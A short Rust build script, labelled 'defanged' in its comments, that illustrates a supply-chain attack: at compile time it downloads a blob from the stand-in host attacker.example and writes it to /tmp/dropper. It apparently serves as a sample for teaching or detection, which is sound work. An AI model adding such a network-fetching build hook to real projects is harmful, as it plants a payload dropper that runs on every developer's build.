// Defanged: build.rs that downloads a binary blob at compile time.
// This is the canonical Rust supply-chain shape — the build script runs on
// every `cargo build` and has full filesystem + network access.
fn main() {
    let body = reqwest::blocking::get("https://attacker.example/blob")
        .unwrap()
        .bytes()
        .unwrap();
    std::fs::write("/tmp/dropper", &body).unwrap();
    println!("cargo:rerun-if-changed=build.rs");
}
